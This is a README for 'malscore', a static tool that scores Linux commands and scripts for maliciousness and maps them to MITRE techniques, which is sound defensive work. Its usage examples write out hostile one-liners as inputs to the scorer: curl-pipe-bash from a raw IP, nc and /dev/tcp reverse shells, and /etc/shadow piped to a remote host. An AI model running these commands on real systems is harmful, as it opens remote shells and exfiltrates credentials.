# malscore — maliciousness scoring for Linux commands and scripts

`malscore` takes a Linux command line or a whole shell script and returns a
**0–100 maliciousness score** with a verdict band, built from the features the
`cmdfeat` extractor already produces. It is the weighting layer the base project
deliberately left out:

```
raw command/script → cmdfeat features → signals → score + MITRE mapping
```

It never executes, expands or resolves anything — it only reads the text, the
same guarantee the rest of `cmdfeat` makes (`tests/test_safety.py`).

---

## Install

```bash
pip install -e .          # provides the `malscore` command (no dependencies)
# or, without installing:
python3 malscore.py "<command>"
```

## Quickstart

```bash
# one command
malscore "curl -s http://45.33.2.1/x.sh | bash"

# a whole script (per-statement + cross-statement analysis)
malscore -f deploy.sh

# from stdin
echo "nc -e /bin/sh 10.0.0.1 4444" | malscore -

# every command in a telemetry feed, high or worse only
malscore --batch events.jsonl --min-verdict high

# full evidence with MITRE technique ids
malscore "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" --explain

# machine-readable
malscore -f suspicious.sh --json

# CI / gate use: non-zero exit when the verdict is high or critical
malscore -f release.sh --fail-on high
```

Example:

```
$ malscore "sudo cat /etc/shadow | nc 45.33.2.1 9001" --explain
██████████████████████░░  score  91/100  CRITICAL
  tactics: exfiltration, credential-access, command-and-control

  evidence:
    [0.60] exfiltration           Credential material is sent over the network
           T1552 T1041
    [0.55] credential-access      The password hash database (/etc/shadow) is accessed
           T1003.008
    [0.35] exfiltration           Data is sent over a raw socket
           T1048
    ...
```

---

## Verdict bands

| score | verdict | meaning |
| --- | --- | --- |
| 80–100 | `critical` | shape is rarely legitimate (reverse shell, disk wipe, uid‑0 account) |
| 60–79 | `high` | strong evidence; review promptly |
| 35–59 | `medium` | suspicious in most contexts (curl‑pipe‑shell, shadow read) |
| 15–34 | `low` | worth noting in combination |
| 0–14 | `benign` | routine |

The bands and weights are a hand-tuned starting point calibrated against the
bundled synthetic datasets, **not** a trained model — every point of the score
traces to a named signal and a MITRE ATT&CK technique.

---

## How the score is built

1. **Features.** The command is run through the `cmdfeat` extractor (576
   deterministic features), including a new `tradecraft` group that recognises
   specific attacker techniques by shape (reverse shells, `/dev/tcp`, disk
   wipes, log tampering, disabling EDR/audit, cloud-metadata credential theft,
   miners, offensive tools, host-namespace entry, …).
2. **Signals.** `cmdfeat/scoring/signals.py` is a catalogue of ~90 named
   signals: a predicate over the feature record, a weight in `(0, 1]`, a MITRE
   tactic and technique ids. A weight reads as "how likely is this hostile if it
   were the only thing we knew".
3. **Aggregation (noisy‑OR).** Weights combine as `1 − ∏(1 − wᵢ)`, so many weak
   signals accumulate but never overflow and one strong signal dominates.
   Redundant signals that share a tactic are damped, so tripping three
   persistence checks is not counted as three independent findings.
4. **Scripts.** A script is split into statements (comments, continuations,
   quotes and here‑documents handled without executing anything); each statement
   is scored, and then **cross‑statement** signals look for patterns no single
   line shows — a file downloaded early and run later, a `tar` whose archive is
   `scp`‑ed away, credential access followed by an upload, activity followed by
   history/log clearing, or a chain spanning three or more tactics.

### Why a static score is not the whole story

A static score measures *what a command intrinsically does*. It cannot know that
`curl … | bash` is fine on a build box and an incident on a ledger database —
that is a **behavioural** judgement relative to a user/host baseline, which is
what the `behavioral` feature group and a downstream anomaly model (e.g. an
Isolation Forest over per-user history) are for. On a 10k‑event synthetic
benign corpus the static scorer kept **every benign event under the `medium`
band** while flagging content‑malicious ones; scenarios it scores low (e.g. data
staging spread across a session) are exactly the behavioural cases an anomaly
layer exists to catch — and script mode recovers many of them once the whole
session is scored together.

The intended production shape is a hybrid:

```
                command / session
                        │
        ┌───────────────┼────────────────┐
        ▼               ▼                 ▼
   malscore        behavioural        deterministic
 (static risk)     anomaly model         rules
        └───────────────┼────────────────┘
                        ▼
                 risk / triage
```

---

## Python API

```python
from cmdfeat.scoring import Analyzer

a = Analyzer()
r = a.assess("curl -s http://1.2.3.4/x.sh | bash")
print(r.score, r.verdict)                 # 67 high
print([h.id for h in r.hits])             # ['download_pipe_interpreter', 'raw_ip_url', ...]
print(r.techniques)                       # ['T1059.004', 'T1105', ...]

r = a.assess(open("deploy.sh").read())    # script: r.per_statement holds each line
print(r.as_dict())                        # JSON-ready
```

`Analyzer.assess` picks command vs script by shape; `assess_command` and
`assess_script` force one. `Analyzer(redact=True)` redacts credential-looking
values before any command text is echoed back.

---

## Extending the scorer

* **New technique detection** → add a feature to `cmdfeat/features/tradecraft.py`
  (declare it in `FEATURES`, return it from `extract`); the schema test enforces
  that declarations and outputs match.
* **New weighting** → add a `Signal` to `cmdfeat/scoring/signals.py` with a
  weight, tactic and technique ids. No other file needs to change.

Tune weights against your own traffic before trusting the absolute numbers; the
*ranking* is more portable than the exact score.
